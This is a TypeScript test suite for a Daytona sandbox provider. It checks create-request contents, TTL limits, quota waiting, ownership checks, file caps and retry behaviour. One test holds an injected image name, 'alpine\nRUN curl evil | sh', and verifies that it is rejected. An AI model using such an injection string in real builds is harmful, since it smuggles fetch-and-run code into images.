import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  FileTooLargeError,
  InfraError,
  SandboxNotFoundError,
  SpecError,
  type SandboxSpec,
} from "@longshore/provider-sdk";
import {
  ALL_STATES,
  DaytonaProvider,
  type DaytonaProviderOptions,
  type UsageRecord,
  isLive,
  readApiKey,
  withSandbox,
} from "../src/index";
import { safeFetch } from "@longshore/net";
import { MOCK_KEY, startMock } from "../src/testing/mock-daytona";

let mock: ReturnType<typeof startMock>;
beforeEach(() => {
  mock = startMock();
});
afterEach(async () => {
  await mock.stop();
});

const make = (o: Partial<DaytonaProviderOptions> = {}) =>
  new DaytonaProvider({
    apiKey: () => MOCK_KEY,
    baseUrl: mock.url,
    pollMs: 5,
    sleep: (ms) => Bun.sleep(Math.min(ms, 5)),
    ...o,
  });

const spec = (over: Partial<SandboxSpec> = {}): SandboxSpec => ({
  name: "job-1",
  labels: { "longshore-run": "run-42" },
  ttlSeconds: 600,
  network: { egress: "open" },
  ...over,
});

/**
 * A fetch that counts the body bytes the CLIENT actually pulls from each response, so a test can
 * assert how much was read before the cap cut it off, independent of how fast the server pushes.
 */
function countingFetch(): { fetch: typeof fetch; read: { bytes: number; last: number } } {
  const read = { bytes: 0, last: 0 };
  const counted = (async (input: Parameters<typeof fetch>[0], init?: RequestInit) => {
    const res = await fetch(input, init);
    if (!res.body) return res;
    const reader = res.body.getReader();
    // highWaterMark 0: pull only when the consumer asks, so the count is what it really read.
    const body = new ReadableStream<Uint8Array>(
      {
        async pull(controller) {
          const { done, value } = await reader.read();
          if (done) return controller.close();
          read.bytes += value.length;
          read.last = value.length;
          controller.enqueue(value);
        },
        cancel: (reason) => reader.cancel(reason),
      },
      { highWaterMark: 0 },
    );
    return new Response(body, { status: res.status, headers: res.headers });
  }) as typeof fetch;
  return { fetch: counted, read };
}

/** The mock learns of a client hang-up asynchronously; wait for it, bounded. */
async function untilCancelled(): Promise<void> {
  for (let i = 0; i < 100 && !mock.stats.hugeCancelled; i++) await Bun.sleep(30);
}

const created = () => mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox");

describe("what is sent on create", () => {
  test("labelled, prefixed, no env, TTL backstops all within 30 minutes, no snapshot objects", async () => {
    const p = make();
    const { id } = await p.create(spec({ network: { egress: "none" } }));
    const body = created()[0]!.body as Record<string, unknown>;
    expect(body.name).toBe("longshore-dev-job-1");
    expect(body.labels).toEqual({ "longshore-run": "run-42", "longshore-dev": "1" });
    expect(body.networkBlockAll).toBe(true);
    expect(body.public).toBe(false);
    expect(body).not.toHaveProperty("env");
    expect(body).not.toHaveProperty("snapshot");
    expect(body).not.toHaveProperty("buildInfo");
    expect(body.ttlMinutes).toBe(10);
    expect(body.autoStopInterval).toBe(10);
    expect(body.autoDeleteInterval).toBe(0); // delete the moment it stops
    expect(mock.requests.some((r) => r.path.startsWith("/api/snapshots"))).toBe(false);
    await p.destroy(id);
  });

  test("a run id is stamped when the spec has none, and the reserved label cannot be spoofed", async () => {
    const p = make({ runId: "abc123" });
    const { id } = await p.create(spec({ labels: {} }));
    expect((created()[0]!.body as { labels: Record<string, string> }).labels).toEqual({
      "longshore-dev": "1",
      "longshore-run": "abc123",
    });
    await p.destroy(id);
    expect(() => p.buildCreateBody(spec({ labels: { "longshore-dev": "0" } }))).toThrow(SpecError);
  });

  test("a TTL over 30 minutes, an unsupported egress policy and templates are refused up front", async () => {
    const p = make();
    for (const bad of [
      spec({ ttlSeconds: 1801 }),
      spec({ ttlSeconds: 0 }),
      spec({ ttlSeconds: 1.5 }),
      spec({ network: { egress: "allowlist", allowHosts: ["x.test"] } }),
      spec({ template: "t" }),
    ]) {
      await expect(p.create(bad)).rejects.toBeInstanceOf(SpecError);
    }
    expect(created()).toHaveLength(0);
    expect(spec({ ttlSeconds: 1800 }).ttlSeconds).toBe(1800);
    expect(p.buildCreateBody(spec({ ttlSeconds: 1800 })).ttlMinutes).toBe(30);
    expect(p.buildCreateBody(spec({ ttlSeconds: 61 })).ttlMinutes).toBe(2);
  });

  test("images need an explicit opt-in because a build creates a snapshot", async () => {
    const p = make();
    // Without the opt-in the image name is ignored: no build, and no snapshot named either.
    const off = p.buildCreateBody(spec({ image: "alpine:3.22" }));
    expect(off).not.toHaveProperty("buildInfo");
    expect(off).not.toHaveProperty("snapshot");
    expect(off).not.toHaveProperty("image");
    const on = make({ allowImageBuild: true });
    expect(on.buildCreateBody(spec({ image: "alpine:3.22" })).buildInfo).toEqual({
      dockerfileContent: "FROM alpine:3.22\n",
    });
    expect(() => on.buildCreateBody(spec({ image: "alpine\nRUN curl evil | sh" }))).toThrow(
      SpecError,
    );
  });

  test("a configured snapshot is used when the scheduler also names an image; the image name is ignored", async () => {
    const p = make({ snapshot: "my-base" });
    const body = p.buildCreateBody(spec({ image: "ghcr.io/example/runner:1" }));
    expect(body.snapshot).toBe("my-base");
    expect(body).not.toHaveProperty("buildInfo");
  });

  test("with no snapshot configured, a spec that names an image starts from the account default snapshot", async () => {
    const p = make();
    const body = p.buildCreateBody(spec({ image: "node:22-bookworm@sha256:" + "a".repeat(64) }));
    // Daytona picks the account default snapshot when the create call names none.
    for (const k of ["snapshot", "image", "buildInfo"]) expect(body).not.toHaveProperty(k);
    // End to end against the mock: the create request carries none of them and succeeds.
    const h = await p.create(spec({ image: "node:22-bookworm" }));
    const post = mock.requests
      .filter((r) => r.method === "POST" && r.path === "/api/sandbox")
      .at(-1);
    expect(post).toBeDefined();
    const sent = post?.body as Record<string, unknown>;
    for (const k of ["snapshot", "image", "buildInfo"]) expect(sent).not.toHaveProperty(k);
    await p.destroy(h.id);
    // The opt-in to build still wins over the default, and a named snapshot over both.
    const build = make({ allowImageBuild: true }).buildCreateBody(spec({ image: "alpine:3.22" }));
    expect(build.buildInfo).toBeDefined();
    expect(
      make({ allowImageBuild: true, snapshot: "s" }).buildCreateBody(
        spec({ image: "alpine:3.22" }),
      ),
    ).toMatchObject({ snapshot: "s" });
  });

  test("clampTtl lowers an over-long TTL to the cap instead of refusing; the cap itself cannot exceed 30 minutes", async () => {
    const strict = make();
    expect(() => strict.buildCreateBody(spec({ ttlSeconds: 3900 }))).toThrow(SpecError);
    const clamp = make({ clampTtl: true });
    const body = clamp.buildCreateBody(spec({ ttlSeconds: 3900 }));
    expect(body).toMatchObject({ ttlMinutes: 30, autoStopInterval: 30, autoDeleteInterval: 0 });
    const lower = make({ clampTtl: true, maxTtlSeconds: 600 });
    expect(lower.buildCreateBody(spec({ ttlSeconds: 3900 }))).toMatchObject({ ttlMinutes: 10 });
    expect(lower.buildCreateBody(spec({ ttlSeconds: 120 }))).toMatchObject({ ttlMinutes: 2 });
    expect(() => make({ maxTtlSeconds: 3600 })).toThrow(RangeError);
    expect(() => make({ maxTtlSeconds: 30 })).toThrow(RangeError);
  });

  test("an existing snapshot can be named; resources are passed in Daytona units", async () => {
    const p = make({ snapshot: "my-base" });
    const body = p.buildCreateBody(spec({ resources: { cpus: 2, memoryMb: 1536, diskGb: 5 } }));
    expect(body).toMatchObject({ snapshot: "my-base", cpu: 2, memory: 2, disk: 5 });
  });
});

describe("live cap and waiting", () => {
  test("the cap is enforced by counting live sandboxes in the account, so a second create waits", async () => {
    const p = make({ maxLive: 1 });
    const a = await p.create(spec({ name: "a" }));
    let second: string | undefined;
    const pending = p.create(spec({ name: "b" })).then((h) => (second = h.id));
    await Bun.sleep(60);
    expect(second).toBeUndefined();
    expect(created()).toHaveLength(1); // nothing was sent for b yet
    await p.destroy(a.id);
    await pending;
    expect(second).toBeDefined();
    await p.destroy(second!);
  });

  test("a different provider instance sees the same cap (it is the account's count, not memory)", async () => {
    const one = make({ maxLive: 1 });
    const a = await one.create(spec({ name: "a" }));
    const two = make({ maxLive: 1, capacityWaitMs: 40 });
    await expect(two.create(spec({ name: "b" }))).rejects.toBeInstanceOf(InfraError);
    await one.destroy(a.id);
  });

  test("concurrent creates in one process are serialized under the cap", async () => {
    const p = make({ maxLive: 2 });
    const results = await Promise.all(
      [1, 2, 3, 4].map((n) =>
        withSandbox(p, spec({ name: `c${n}` }), async (id) => {
          expect(mock.sandboxes.size).toBeLessThanOrEqual(2);
          await Bun.sleep(15);
          return id;
        }),
      ),
    );
    expect(new Set(results).size).toBe(4);
    expect(mock.sandboxes.size).toBe(0);
  });

  test("it waits while the owner's CI has 8 or more live sandboxes, and goes ahead once under", async () => {
    const ids = [
      "squirrel-ci",
      "squirrel-pub-ci",
      "squirrel-release",
      "squirrel-ci",
      "squirrel-ci",
      "squirrel-pub-ci",
      "squirrel-release",
      "squirrel-ci",
    ].map((k, i) => mock.addForeign(`their-${i}`, { project: k }));
    const p = make();
    let done = false;
    const pending = p.create(spec()).then((h) => {
      done = true;
      return h;
    });
    await Bun.sleep(60);
    expect(done).toBe(false);
    mock.sandboxes.delete(ids[0]!); // 7 left
    const h = await pending;
    expect(done).toBe(true);
    await p.destroy(h.id);
    // their sandboxes are untouched
    expect(mock.sandboxes.size).toBe(7);
    expect(
      mock.requests
        .filter((r) => r.method === "DELETE")
        .every((r) => !r.path.includes("their-") && !r.path.includes("foreign")),
    ).toBe(true);
  });

  test("the owner's CI is matched by the project label or snapshot, and counted in every quota state", async () => {
    // 4 by label value (how the account really labels them), 4 by snapshot: 8 live
    for (let i = 0; i < 2; i++) mock.addForeign(`v-${i}`, { project: "squirrel-pub-ci" });
    for (let i = 0; i < 2; i++)
      mock.addForeign(`w-${i}`, { project: "squirrel-release" }, "pending_build");
    for (let i = 0; i < 2; i++)
      mock.addForeign(`s-${i}`, { project: "other" }, "starting", "squirrel-release");
    for (let i = 0; i < 2; i++)
      mock.addForeign(`t-${i}`, { project: "other" }, "building_snapshot", "squirrel-ci");
    // none of these count: not live, wrong key, wrong value, someone else's
    for (let i = 0; i < 20; i++) {
      mock.addForeign(
        `idle-${i}`,
        { project: "squirrel-ci" },
        ["stopped", "archived", "error", "destroyed"][i % 4],
        "squirrel-ci",
      );
    }
    mock.addForeign("key", { "squirrel-ci": "1" });
    mock.addForeign("lane", { lane: "squirrel-ci" });
    mock.addForeign("unrelated", { project: "someone-else" }, "started", "daytona-small");
    const p = make({ capacityWaitMs: 40 });
    await expect(p.create(spec())).rejects.toThrow(/CI has 8 live/);
    // the check asked only for states that hold quota, not for stopped or archived ones
    const asked = mock.requests.filter(
      (r) => r.path === "/api/sandbox" && r.query.includes("states=started"),
    );
    expect(asked.length).toBeGreaterThan(0);
    const q = decodeURIComponent(asked[0]!.query);
    expect(q).not.toMatch(/states=(stopped|archived|destroyed|error)\b/);
  });

  test("each state is tested for the owner-CI wait: 8 sandboxes block exactly when the state holds quota", async () => {
    for (const state of ALL_STATES) {
      await mock.stop();
      mock = startMock();
      for (let i = 0; i < 8; i++) mock.addForeign(`ci-${i}`, { project: "squirrel-ci" }, state);
      const p = make({ capacityWaitMs: 30 });
      if (isLive(state)) {
        await expect(p.create(spec())).rejects.toThrow(/CI has 8 live/);
      } else {
        const h = await p.create(spec());
        await p.destroy(h.id);
      }
    }
  });

  test("each state is tested for our own cap: a sandbox of ours blocks the next create exactly when its state holds quota", async () => {
    for (const state of ALL_STATES) {
      await mock.stop();
      mock = startMock();
      const p = make({ maxLive: 1, capacityWaitMs: 30 });
      const a = await p.create(spec({ name: "a" }));
      mock.sandboxes.get(a.id)!.state = state;
      if (isLive(state)) {
        await expect(p.create(spec({ name: "b" }))).rejects.toThrow(/max 1/);
      } else {
        const b = await p.create(spec({ name: "b" }));
        mock.sandboxes.get(a.id)!.state = "started";
        await p.destroy(b.id);
      }
      mock.sandboxes.get(a.id)!.state = "started";
      await p.destroy(a.id);
    }
  });

  test("stopped sandboxes of the owner's CI do not hold us up", async () => {
    for (let i = 0; i < 10; i++)
      mock.addForeign(`their-${i}`, { project: "squirrel-ci" }, "stopped");
    const p = make({ capacityWaitMs: 40 });
    const h = await p.create(spec());
    await p.destroy(h.id);
  });

  test("gives up with a retryable error when capacity never frees", async () => {
    const p = make({ maxLive: 1, capacityWaitMs: 40 });
    const a = await p.create(spec());
    const err = await p.create(spec()).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(InfraError);
    expect((err as InfraError).message).toContain("max 1");
    await p.destroy(a.id);
  });
});

describe("only ever our own sandboxes", () => {
  test("list, count and destroyByLabels never see or delete a foreign sandbox", async () => {
    const theirs = mock.addForeign("squirrel-ci-1", { "squirrel-ci": "1", grp: "g" });
    const lookalike = mock.addForeign("longshore-dev-fake", { grp: "g" }); // name prefix but no label
    const p = make();
    const mine = await p.create(spec({ labels: { grp: "g" } }));
    expect((await p.list({ labels: { grp: "g" } })).map((s) => s.id)).toEqual([mine.id]);
    expect(await p.count({})).toBe(1);
    expect(await p.destroyByLabels({ grp: "g" })).toBe(1);
    expect(mock.sandboxes.has(theirs)).toBe(true);
    expect(mock.sandboxes.has(lookalike)).toBe(true);
    // every list query carried our label
    const lists = mock.requests.filter(
      (r) => r.method === "GET" && r.path === "/api/sandbox" && r.query.includes("labels"),
    );
    expect(lists.length).toBeGreaterThan(0);
  });

  test("destroy, exec and files refuse a sandbox that is not ours", async () => {
    const theirs = mock.addForeign("squirrel-ci-1", { "squirrel-ci": "1" });
    const p = make();
    await expect(p.destroy(theirs)).rejects.toBeInstanceOf(SpecError);
    await expect(
      p.exec.start(theirs, { argv: ["true"], timeoutSeconds: 5 }),
    ).rejects.toBeInstanceOf(SpecError);
    await expect(p.files.put(theirs, "/tmp/x", new Uint8Array(1))).rejects.toBeInstanceOf(
      SpecError,
    );
    expect(mock.sandboxes.has(theirs)).toBe(true);
    expect(mock.requests.some((r) => r.method === "DELETE")).toBe(false);
    expect(mock.requests.some((r) => r.path.startsWith("/toolbox/"))).toBe(false);
  });

  test("destroy of a missing sandbox succeeds; destroyByLabels needs labels", async () => {
    const p = make();
    await p.destroy("nope");
    await expect(p.destroyByLabels({})).rejects.toBeInstanceOf(SpecError);
  });

  test("listing pages through every result", async () => {
    await mock.stop();
    mock = startMock({ pageSize: 2 });
    const p = make({ maxLive: 3 });
    const hs = [
      await p.create(spec({ name: "a", labels: { g: "1" } })),
      await p.create(spec({ name: "b", labels: { g: "1" } })),
      await p.create(spec({ name: "c", labels: { g: "1" } })),
    ];
    expect(await p.count({ labels: { g: "1" } })).toBe(3);
    await p.destroyByLabels({ g: "1" });
    expect(hs).toHaveLength(3);
  });
});

describe("eventually consistent listings", () => {
  test("create returns only once the sandbox is listed; destroy only once it is gone from the listing", async () => {
    await mock.stop();
    mock = startMock({ listLagMs: 150 });
    const p = make({ maxLive: 2 });
    const a = await p.create(spec({ name: "a", labels: { g: "1" } }));
    expect(await p.count({ labels: { g: "1" } })).toBe(1); // visible at once, despite the lag
    await p.destroy(a.id);
    expect(await p.count({ labels: { g: "1" } })).toBe(0); // and gone at once
    expect(await p.destroyByLabels({ g: "1" })).toBe(0);
  });
});

describe("delete in finally and cleanup", () => {
  test("destroy waits until the sandbox is really gone, so counts and the cap are true", async () => {
    await mock.stop();
    mock = startMock({ deleteDelayMs: 120 });
    const p = make({ maxLive: 1 });
    const a = await p.create(spec({ name: "a" }));
    const t0 = Date.now();
    await p.destroy(a.id);
    expect(Date.now() - t0).toBeGreaterThanOrEqual(100); // waited out the teardown
    expect(mock.sandboxes.size).toBe(0);
    expect(await p.count({})).toBe(0);
    // a sandbox that is being destroyed still holds quota until it is gone
    const b = await p.create(spec({ name: "b" }));
    const c = p.destroy(b.id);
    await Bun.sleep(20);
    expect(await p.count({})).toBe(1);
    await c;
    expect(await p.count({})).toBe(0);
  });

  test("withSandbox deletes when the work throws", async () => {
    const p = make();
    await expect(
      withSandbox(p, spec(), async () => {
        throw new Error("job failed");
      }),
    ).rejects.toThrow("job failed");
    expect(mock.sandboxes.size).toBe(0);
  });

  test("a sandbox that never starts is deleted and the error is retryable", async () => {
    await mock.stop();
    mock = startMock({ startDelayMs: 10_000 });
    const p = make({ startTimeoutMs: 60 });
    await expect(p.create(spec())).rejects.toBeInstanceOf(InfraError);
    expect(mock.sandboxes.size).toBe(0);
  });

  test("a failed create request leaves nothing behind and maps the status", async () => {
    mock.failNext.createStatus = 500;
    const p = make();
    await expect(p.create(spec())).rejects.toBeInstanceOf(InfraError);
    mock.failNext.createStatus = 400;
    await expect(p.create(spec())).rejects.toBeInstanceOf(SpecError);
    expect(mock.sandboxes.size).toBe(0);
  });

  test("usage is reported on delete with the minutes the sandbox lived", async () => {
    const seen: UsageRecord[] = [];
    const p = make({ onUsage: (r) => seen.push(r) });
    const h = await p.create(spec());
    await p.destroy(h.id);
    await p.destroy(h.id); // idempotent: no second record
    expect(seen).toHaveLength(1);
    expect(seen[0]).toMatchObject({ sandboxId: h.id, name: "longshore-dev-job-1" });
    expect(seen[0]!.seconds).toBeGreaterThanOrEqual(0);
  });
});

describe("api key and errors", () => {
  test("the key is read at runtime from a file or an env var and never appears in errors", async () => {
    const file = `${import.meta.dir}/.tmp-key`;
    await Bun.write(file, `${MOCK_KEY}\n`);
    try {
      expect(await readApiKey({ file })).toBe(MOCK_KEY);
      await make({ apiKey: { file } }).healthcheck();
    } finally {
      await Bun.file(file).delete();
    }
    process.env.TT_TEST_DAYTONA_KEY = MOCK_KEY;
    try {
      await make({ apiKey: { env: "TT_TEST_DAYTONA_KEY" } }).healthcheck();
    } finally {
      delete process.env.TT_TEST_DAYTONA_KEY;
    }
    await expect(readApiKey({ env: "TT_DEFINITELY_UNSET_VAR" })).rejects.toBeInstanceOf(SpecError);
    await expect(readApiKey({ file: "/nonexistent/key" })).rejects.toBeInstanceOf(SpecError);
    const bad = make({ apiKey: () => "wrong-key-value" });
    const err = (await bad.healthcheck().catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).not.toContain("wrong-key-value");
    expect(JSON.stringify(err, Object.getOwnPropertyNames(err))).not.toContain("wrong-key-value");
  });

  test("a sandbox that disappears maps to SandboxNotFoundError on exec", async () => {
    const p = make();
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, { argv: ["sleep", "5"], timeoutSeconds: 30 });
    mock.sandboxes.delete(h.id);
    expect((await p.exec.status(h.id, execId)).state).toBe("lost");
    await expect(p.files.put(h.id, "/tmp/x", new Uint8Array(1))).rejects.toBeInstanceOf(
      SandboxNotFoundError,
    );
  });

  test("files.get streams with a running byte count: a huge body with no content-length is cut off", async () => {
    const counter = countingFetch();
    const p = make({ fetch: counter.fetch });
    const h = await p.create(spec());
    const cap = 100_000;
    const before = counter.read.bytes;
    await expect(p.files.get(h.id, "/tmp/__huge", cap)).rejects.toBeInstanceOf(FileTooLargeError);
    // It stopped at the first chunk that crossed the cap: everything before that chunk was within
    // the cap, and with it the total passed it. (Chunk sizes depend on the network, so this does
    // not assume one.)
    const got = counter.read.bytes - before;
    expect(got).toBeGreaterThan(cap);
    expect(got - counter.read.last).toBeLessThanOrEqual(cap);
    await untilCancelled(); // the server notices the hang-up asynchronously
    expect(mock.stats.hugeCancelled).toBe(true);
    await p.destroy(h.id);
  });

  test("an oversized API reply is refused as an infrastructure fault, not buffered", async () => {
    const counter = countingFetch();
    const p = make({ fetch: counter.fetch });
    mock.setHugeList(true);
    const before = counter.read.bytes;
    const err = await p.count({}).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(InfraError);
    // stopped at the first chunk that crossed the 16 MiB cap
    const got = counter.read.bytes - before;
    const cap = 16 * 1024 * 1024;
    expect(got).toBeGreaterThan(cap);
    expect(got - counter.read.last).toBeLessThanOrEqual(cap);
    await untilCancelled();
    expect(mock.stats.hugeCancelled).toBe(true);
  });

  test("file caps: put over the cap and get over maxBytes are FileTooLargeError", async () => {
    const p = make({ maxFileBytes: 16 });
    const h = await p.create(spec());
    await expect(p.files.put(h.id, "/tmp/x", new Uint8Array(17))).rejects.toBeInstanceOf(
      FileTooLargeError,
    );
    await p.files.put(h.id, "/tmp/tt-daytona-test/a.bin", new Uint8Array([1, 2, 3]));
    await expect(p.files.get(h.id, "/tmp/tt-daytona-test/a.bin", 2)).rejects.toBeInstanceOf(
      FileTooLargeError,
    );
    await expect(p.files.get(h.id, "/tmp/tt-daytona-test/missing", 10)).rejects.toBeInstanceOf(
      SpecError,
    );
    await p.destroy(h.id);
  });
});

describe("transient toolbox failures do not end a running job", () => {
  const FAST = { budgetMs: 3000, baseDelayMs: 1, maxDelayMs: 2 };
  const timeout = (): never => {
    throw new DOMException("The operation timed out.", "TimeoutError");
  };

  /** A fetch that fails chosen toolbox execute calls and counts them. */
  function flaky(
    plan: (n: number, body: string) => "ok" | "fail-before" | "fail-after" | Response,
  ) {
    const seen = { calls: 0, failed: 0 };
    const fn = (async (input: Parameters<typeof safeFetch>[0], init?: RequestInit) => {
      if (!String(input).endsWith("/process/execute")) return safeFetch(input, init);
      seen.calls += 1;
      const verdict = plan(seen.calls, String(init?.body ?? ""));
      if (verdict instanceof Response) return verdict;
      if (verdict === "fail-before") {
        seen.failed += 1;
        return timeout();
      }
      const res = await safeFetch(input, init);
      if (verdict === "fail-after") {
        seen.failed += 1;
        return timeout();
      }
      return res;
    }) as typeof safeFetch;
    return { fn, seen };
  }

  const isLaunch = (body: string): boolean => body.includes("setsid");

  test("a status read that times out a few times, then answers, returns the real state", async () => {
    let failing = false;
    const f = flaky(() => (failing ? "fail-before" : "ok"));
    const logs: string[] = [];
    const p = make({ fetch: f.fn, exec: { retry: FAST }, log: (m) => logs.push(m) });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", "echo hi"],
      timeoutSeconds: 30,
    });
    await Bun.sleep(300);
    const before = f.seen.calls;
    failing = true;
    const pending = p.exec.status(h.id, execId);
    // Three failures, then it recovers.
    const stop = setInterval(() => {
      if (f.seen.failed >= 3) failing = false;
    }, 1);
    const st = await pending;
    clearInterval(stop);
    expect(st.state).toBe("exited");
    expect(f.seen.calls - before).toBeGreaterThanOrEqual(4);
    // Each retry was logged with the call and attempt, and nothing secret.
    expect(logs.length).toBeGreaterThanOrEqual(3);
    expect(logs[0]).toContain("exec status");
    expect(logs[0]).toContain("attempt 1");
    expect(logs.join("\n")).not.toContain(MOCK_KEY);
    await p.destroy(h.id);
  });

  test("a log read is retried the same way", async () => {
    let failing = false;
    const f = flaky(() => (failing ? "fail-before" : "ok"));
    const p = make({ fetch: f.fn, exec: { retry: FAST } });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", "echo hello-log"],
      timeoutSeconds: 30,
    });
    await Bun.sleep(300);
    failing = true;
    const pending = p.exec.logs(h.id, execId, { fromOffset: 0, maxBytes: 1000 });
    const stop = setInterval(() => {
      if (f.seen.failed >= 2) failing = false;
    }, 1);
    const out = await pending;
    clearInterval(stop);
    expect(new TextDecoder().decode(out.bytes)).toContain("hello-log");
    await p.destroy(h.id);
  });

  test("a toolbox that always times out ends as InfraError after the budget, saying how many attempts", async () => {
    const f = flaky(() => "ok");
    const p = make({
      fetch: f.fn,
      exec: { retry: { budgetMs: 150, baseDelayMs: 5, maxDelayMs: 10 } },
    });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", "sleep 1"],
      timeoutSeconds: 30,
    });
    const dead = flaky(() => "fail-before");
    const q = make({
      fetch: dead.fn,
      exec: { retry: { budgetMs: 150, baseDelayMs: 5, maxDelayMs: 10 } },
    });
    const t0 = Date.now();
    const err = (await q.exec.status(h.id, execId).catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).toMatch(/exec status failed after \d+ attempts/);
    expect(err.message).toContain("TimeoutError");
    expect(Date.now() - t0).toBeLessThan(3000);
    expect(dead.seen.calls).toBeGreaterThan(2);
    await p.destroy(h.id);
  });

  test("errors that are not transient are not retried: a 500 and a bad request", async () => {
    for (const status of [500, 400]) {
      let armed = false;
      const f = flaky(() => {
        if (!armed) return "ok";
        armed = false;
        return new Response(JSON.stringify({ message: "nope" }), { status });
      });
      const p = make({ fetch: f.fn, exec: { retry: FAST } });
      const h = await p.create(spec());
      const calls = f.seen.calls;
      armed = true;
      await expect(p.exec.status(h.id, "tt1-" + "a".repeat(24))).rejects.toBeInstanceOf(
        status === 500 ? InfraError : SpecError,
      );
      expect(f.seen.calls - calls).toBe(1);
      await p.destroy(h.id);
    }
  });

  test("503 and 429 are transient", async () => {
    for (const status of [503, 429, 502, 504]) {
      let armed = false;
      const f = flaky(() => {
        if (!armed) return "ok";
        armed = false;
        return new Response("{}", { status });
      });
      const p = make({ fetch: f.fn, exec: { retry: FAST } });
      const h = await p.create(spec());
      const calls = f.seen.calls;
      armed = true;
      const st = await p.exec.status(h.id, "tt1-" + "b".repeat(24));
      expect(st.state).toBe("lost");
      expect(f.seen.calls - calls).toBeGreaterThanOrEqual(2);
      await p.destroy(h.id);
    }
  });

  test("a start whose reply was lost but which ran does not run twice", async () => {
    const marker = `/tmp/tt-once-${Date.now()}-a`;
    let done = false;
    const f = flaky((_n, body) => (isLaunch(body) && !done ? ((done = true), "fail-after") : "ok"));
    const p = make({ fetch: f.fn, exec: { retry: FAST } });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", `echo x >> ${marker}; sleep 2`],
      timeoutSeconds: 30,
    });
    expect(execId).toMatch(/^tt1-/);
    await Bun.sleep(2500);
    const lines = (await Bun.file(marker).text()).trim().split("\n");
    expect(lines).toHaveLength(1);
    await Bun.$`rm -f ${marker}`;
    await p.destroy(h.id);
  });

  test("a start whose request never arrived is launched once, under the same id", async () => {
    const marker = `/tmp/tt-once-${Date.now()}-b`;
    let done = false;
    const f = flaky((_n, body) =>
      isLaunch(body) && !done ? ((done = true), "fail-before") : "ok",
    );
    const p = make({ fetch: f.fn, exec: { retry: FAST } });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", `echo x >> ${marker}; sleep 1`],
      timeoutSeconds: 30,
    });
    await Bun.sleep(2000);
    expect((await Bun.file(marker).text()).trim().split("\n")).toHaveLength(1);
    expect((await p.exec.status(h.id, execId)).state).toBe("exited");
    await Bun.$`rm -f ${marker}`;
    await p.destroy(h.id);
  });

  test("the original request landing AFTER its repeat still gives exactly one process", async () => {
    const marker = `/tmp/tt-once-${Date.now()}-late`;
    let deferred = false;
    const late: Promise<unknown>[] = [];
    const seen = { launches: 0 };
    const base = flaky(() => "ok");
    // The first launch times out at the client at once, but its request reaches the sandbox only
    // after the repeat has already run.
    const fn = (async (input: Parameters<typeof safeFetch>[0], init?: RequestInit) => {
      const body = String(init?.body ?? "");
      if (String(input).endsWith("/process/execute") && isLaunch(body)) {
        seen.launches += 1;
        if (!deferred) {
          deferred = true;
          late.push(Bun.sleep(800).then(() => safeFetch(input, init)));
          return timeout();
        }
      }
      return base.fn(input, init);
    }) as typeof safeFetch;
    const p = make({ fetch: fn, exec: { retry: FAST } });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", `echo x >> ${marker}; sleep 3`],
      timeoutSeconds: 30,
    });
    // The repeat has run; now the original lands.
    await Promise.all(late);
    await Bun.sleep(300);
    expect(seen.launches).toBe(2);
    expect((await Bun.file(marker).text()).trim().split("\n")).toHaveLength(1);
    expect((await p.exec.status(h.id, execId)).state).toBe("running");
    await Bun.sleep(3000);
    expect((await p.exec.status(h.id, execId)).state).toBe("exited");
    await Bun.$`rm -f ${marker}`;
    await p.destroy(h.id);
  });

  test("an ordinary start runs the command once", async () => {
    const marker = `/tmp/tt-once-${Date.now()}-c`;
    const f = flaky(() => "ok");
    const p = make({ fetch: f.fn });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", `echo x >> ${marker}`],
      timeoutSeconds: 30,
    });
    await Bun.sleep(500);
    expect((await Bun.file(marker).text()).trim().split("\n")).toHaveLength(1);
    expect(execId).toMatch(/^tt1-/);
    await Bun.$`rm -f ${marker}`;
    await p.destroy(h.id);
  });
});
